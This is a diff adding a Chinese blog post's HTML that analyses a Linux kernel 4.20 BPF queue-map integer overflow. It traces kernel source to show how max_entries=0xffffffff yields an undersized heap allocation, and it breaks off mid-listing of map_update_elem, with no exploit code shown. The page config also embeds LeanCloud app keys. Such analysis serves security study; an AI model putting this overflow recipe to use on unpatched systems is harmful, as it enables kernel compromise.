@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>Linux kernel 4.20 BPF 整数溢出漏洞 | DaJun的Blog | 脑袋空空</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="kernel">
+    <link rel="shortcut icon" href="/img/girl.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	false,
+            lv: JSON.parse('{"enable":true,"app_id":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","app_key":"Qn93YchF3LXlS54tbXjzMvAI","icon":true}'),
+            v: JSON.parse('{"enable":true,"appid":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","appkey":"Qn93YchF3LXlS54tbXjzMvAI","notify":true,"verify":true,"placeholder":"想说什么...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/girl.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">DaJun</h5>
+          <a href="mailto:571986260@qq.com" title="571986260@qq.com" class="mail">
+            
+              <span>5</span>
+            
+              <span>7</span>
+            
+              <span>1</span>
+            
+              <span>9</span>
+            
+              <span>8</span>
+            
+              <span>6</span>
+            
+              <span>2</span>
+            
+              <span>6</span>
+            
+              <span>0</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/pwn-tips"  >
+                <i class="icon icon-lg icon-info"></i>
+                PWN TIPS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/todo"  >
+                <i class="icon icon-lg icon-clock-o"></i>
+                TODO
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/DayJun" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>Linux kernel 4.20 BPF 整数溢出漏洞</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/dawn.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">Linux kernel 4.20 BPF 整数溢出漏洞</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-04-04T13:15:38.000Z" itemprop="datePublished" class="page-time">
+  2020-04-04
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/CVE/">CVE</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-Linux-kernel-4-20-BPF-整数溢出漏洞"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">Linux kernel 4.20 BPF 整数溢出漏洞</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-04-04 21:15:38" datetime="2020-04-04T13:15:38.000Z"  itemprop="datePublished">2020-04-04</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/CVE/">CVE</a></li></ul>
+
+
+
+            
+	<span id="/2020/04/04/Linux-kernel-4-20-BPF-整数溢出漏洞/" class="leancloud_visitors" data-flag-title="Linux kernel 4.20 BPF 整数溢出漏洞" title="Linux kernel 4.20 BPF 整数溢出漏洞">
+		
+			<i class="icon icon-eye"></i>
+		
+		<span class="leancloud-visitors-count"></span>
+	</span>
+ 
+
+            
+    <span class="leancloud-comment">
+        <i class="icon icon-comment-o"></i>
+        <a href="/2020/04/04/Linux-kernel-4-20-BPF-整数溢出漏洞/#comment">
+            <span class="valine-comment-count" data-xid="/2020/04/04/Linux-kernel-4-20-BPF-整数溢出漏洞/"></span>
+        </a>
+    </span>
+
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p><code>Linux kernel 4.20-rc1-rc4</code>中存在一个整数溢出漏洞，导致堆溢出</p>
+<a id="more"></a>
+
+<h1 id="BPF"><a href="#BPF" class="headerlink" title="BPF"></a>BPF</h1><p>根据<code>man bpf</code>中的描述</p>
+<blockquote>
+<p>描述：</p>
+<p>​    bpf系统调用执行一系列与extended Berkeley Packet Filters相关的操作，eBPF与传统的BPF相似，作用为    过滤网络包。对于eBPF和传统的BPF来说，为了确保它们进行的操作不会损伤运行时的系统，内核会在加    载程序之前静态地分析它们。</p>
+<p>eBPF设计/架构：</p>
+<p>eBPF maps是一种通用的数据结构，它被用来存储不同的数据类型。数据类型通常被视为二进制块，所以用户需要在创建maps的时候指定key和value的size，所以一个给定的键值对可以有任意的结构。一个用户进程可以创建多个maps，并可以通过文件描述符来访问它们。不同的eBPF程序可以平行地访问相同的maps。关于往maps中存什么完全是由用户进程和eBPF程序来决定的。</p>
+<p>有一种特殊的map类型，被称为program array。这种map存储指向其他eBPF的文件描述符，当在该map中执行lookup的时候，程序流将被重定向到另一个eBPF程序的开头，而不会返回到正在调用的程序。嵌套的层数最大为32，所以无法实现无限循环。在运行时，在map中存储的文件描述符可以被修改，所以程序如果有什么特殊的需要的话是可以在功能上进行修改的。所有在program array中的程序都必须使用bpf系统调用提前加载到内核之中。如果map的lookup失败的话，程序会继续执行下去。</p>
+<p>每一个eBPF程序都是一组指令，在完成之前都可以安全地执行。内核中的验证器会静态地确定程序终止或者安全地被执行。在验证的时候，内核会增加被验证的map的引用计数来确保被附加的map不能在程序卸载之前被移除。</p>
+<p>更多详见<code>man bpf</code></p>
+</blockquote>
+<h1 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h1><p>调用bpf系统调用有以下两种方式：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span>;</span><br><span class="line">syscall(__NR_bpf, cmd, attr, size);</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>bpf</code>函数似乎在<code>bpf.h</code>中并没有被声明，所以无法被调用，因此我使用的第二种方法</p>
+<p>在<code>cmd</code>为<code>BPF_MAP_CREATE</code>即<code>0</code>的时候，根据代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(bpf, <span class="keyword">int</span>, cmd, <span class="keyword">union</span> bpf_attr __user *, uattr, <span class="keyword">unsigned</span> <span class="keyword">int</span>, size)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;&#125;;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sysctl_unprivileged_bpf_disabled &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	err = bpf_check_uarg_tail_zero(uattr, <span class="keyword">sizeof</span>(attr), size);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	size = <span class="keyword">min_t</span>(u32, size, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* copy attributes from user space, may be less than sizeof(bpf_attr) */</span></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;attr, uattr, size) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">	err = security_bpf(cmd, &amp;attr, size);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> BPF_MAP_CREATE:		&lt;&lt;-----------------------------------</span><br><span class="line">		err = map_create(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>
+
+<p>得知，会调用<code>map_create</code>函数来创建一个<code>map</code></p>
+<p>跟进map_create函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_create</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">	<span class="keyword">int</span> f_flags;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	err = CHECK_ATTR(BPF_MAP_CREATE);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	f_flags = bpf_get_file_flag(attr-&gt;map_flags);</span><br><span class="line">	<span class="keyword">if</span> (f_flags &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> f_flags;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (numa_node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">	    ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)numa_node &gt;= nr_node_ids ||</span><br><span class="line">	     !node_online(numa_node)))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* find map type and init map: hashtable vs rbtree vs bloom vs ... */</span></span><br><span class="line">	<span class="built_in">map</span> = find_and_alloc_map(attr);		&lt;&lt;----------------------------------</span><br><span class="line">	........</span><br></pre></td></tr></table></figure>
+
+<p>它是调用<code>find_and_alloc_map</code>来创建<code>map</code>的</p>
+<p>跟进<code>find_and_alloc_map</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">find_and_alloc_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">	u32 type = attr-&gt;map_type;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (type &gt;= ARRAY_SIZE(bpf_map_types))</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">	type = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));		&lt;&lt;------------- <span class="number">1</span></span><br><span class="line">	ops = bpf_map_types[type];		&lt;&lt;----------------- <span class="number">2</span></span><br><span class="line">	<span class="keyword">if</span> (!ops)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ops-&gt;map_alloc_check) &#123;</span><br><span class="line">		err = ops-&gt;map_alloc_check(attr);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (attr-&gt;map_ifindex)</span><br><span class="line">		ops = &amp;bpf_map_offload_ops;</span><br><span class="line">	<span class="built_in">map</span> = ops-&gt;map_alloc(attr);		&lt;&lt;----------------- <span class="number">3</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">	<span class="built_in">map</span>-&gt;ops = ops;</span><br><span class="line">	<span class="built_in">map</span>-&gt;map_type = type;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它在1处根据<code>map_type</code>来查找一个<code>type</code>，然后从<code>bpf_map_types</code>中以<code>type</code>为<code>index</code>来查找一个结构体，该结构体内存储着几个函数指针，其中在3处会调用<code>map_alloc</code>所指向的函数</p>
+<p>如果我们的<code>map_type</code>传入<code>BPF_MAP_TYPE_QUEUE</code>的话，取出的<code>ops</code>会是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">queue_map_ops</span> = &#123;</span></span><br><span class="line">	.map_alloc_check = queue_stack_map_alloc_check,</span><br><span class="line">	.map_alloc = queue_stack_map_alloc,</span><br><span class="line">	.map_free = queue_stack_map_free,</span><br><span class="line">	.map_lookup_elem = queue_stack_map_lookup_elem,</span><br><span class="line">	.map_update_elem = queue_stack_map_update_elem,</span><br><span class="line">	.map_delete_elem = queue_stack_map_delete_elem,</span><br><span class="line">	.map_push_elem = queue_stack_map_push_elem,</span><br><span class="line">	.map_pop_elem = queue_map_pop_elem,</span><br><span class="line">	.map_peek_elem = queue_map_peek_elem,</span><br><span class="line">	.map_get_next_key = queue_stack_map_get_next_key,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>因此在3处调用的就是<code>queue_stack_map_alloc</code>函数</p>
+<p>跟进<code>queue_stack_map_alloc</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">queue_stack_map_alloc</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret, numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span>;</span></span><br><span class="line">	u32 size, value_size;</span><br><span class="line">	u64 queue_size, cost;</span><br><span class="line"></span><br><span class="line">	size = attr-&gt;max_entries + <span class="number">1</span>;		&lt;&lt;--------------------- <span class="number">1</span></span><br><span class="line">	value_size = attr-&gt;value_size;</span><br><span class="line"></span><br><span class="line">	queue_size = <span class="keyword">sizeof</span>(*qs) + (u64) value_size * size;</span><br><span class="line"></span><br><span class="line">	cost = queue_size;</span><br><span class="line">	<span class="keyword">if</span> (cost &gt;= U32_MAX - PAGE_SIZE)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-E2BIG);</span><br><span class="line"></span><br><span class="line">	cost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	ret = bpf_map_precharge_memlock(cost);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line"></span><br><span class="line">	qs = bpf_map_area_alloc(queue_size, numa_node);		&lt;&lt;------------------ <span class="number">2</span></span><br><span class="line">	<span class="keyword">if</span> (!qs)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(qs, <span class="number">0</span>, <span class="keyword">sizeof</span>(*qs));</span><br><span class="line"></span><br><span class="line">	bpf_map_init_from_attr(&amp;qs-&gt;<span class="built_in">map</span>, attr);</span><br><span class="line"></span><br><span class="line">	qs-&gt;<span class="built_in">map</span>.pages = cost;</span><br><span class="line">	qs-&gt;size = size;</span><br><span class="line"></span><br><span class="line">	raw_spin_lock_init(&amp;qs-&gt;lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> &amp;qs-&gt;<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>1处<code>size = attr-&gt;max_entries + 1</code>，这里<code>attr-&gt;max_entries</code>是一个<code>u32</code>，而它的值是用户传入的</p>
+<p>那么如果用户传入一个<code>0xffffffff</code>，<code>size</code>就会是0</p>
+<p>由<code>queue_size = sizeof(*qs) + (u64) value_size * size;</code>得，<code>queue_size</code>为<code>sizeof(*qs)</code>，并将它作为一个参数传入<code>bpf_map_area_alloc</code>函数</p>
+<p>跟进<code>bpf_map_area_alloc</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">bpf_map_area_alloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">int</span> numa_node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* We definitely need __GFP_NORETRY, so OOM killer doesn't</span></span><br><span class="line"><span class="comment">	 * trigger under memory pressure as we really just want to</span></span><br><span class="line"><span class="comment">	 * fail instead.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">gfp_t</span> flags = __GFP_NOWARN | __GFP_NORETRY | __GFP_ZERO;</span><br><span class="line">	<span class="keyword">void</span> *area;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size &lt;= (PAGE_SIZE &lt;&lt; PAGE_ALLOC_COSTLY_ORDER)) &#123;</span><br><span class="line">		area = kmalloc_node(size, GFP_USER | flags, numa_node);</span><br><span class="line">		<span class="keyword">if</span> (area != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">return</span> area;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> __vmalloc_node_flags_caller(size, numa_node, GFP_KERNEL | flags,</span><br><span class="line">					   __builtin_return_address(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来该函数是根据<code>size</code>为该<code>map</code>分配堆内存</p>
+<p>这里其实就明白，上面的函数中发生了整数溢出，导致分配出来的堆比实际需要的堆要小</p>
+<h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><p>再回到第一个函数，如果<code>cmd</code>为<code>BPF_MAP_UPDATE_ELEM</code>即<code>2</code>的时候</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_CREATE:</span><br><span class="line">	err = map_create(&amp;attr);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_LOOKUP_ELEM:</span><br><span class="line">	err = map_lookup_elem(&amp;attr);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_UPDATE_ELEM:</span><br><span class="line">	err = map_update_elem(&amp;attr);</span><br><span class="line">   ......</span><br></pre></td></tr></table></figure>
+
+<p>就会调用<code>map_update_elem</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_update_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line">	<span class="keyword">void</span> __user *uvalue = u64_to_user_ptr(attr-&gt;value);</span><br><span class="line">	<span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *key, *value;</span><br><span class="line">	u32 value_size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_UPDATE_ELEM))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	f = fdget(ufd);</span><br><span class="line">	<span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(f.file-&gt;f_mode &amp; FMODE_CAN_WRITE)) &#123;</span><br><span class="line">		err = -EPERM;</span><br><span class="line">		<span class="keyword">goto</span> err_put;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">		err = PTR_ERR(key);</span><br><span class="line">		<span class="keyword">goto</span> err_put;</span><br><span class="line">	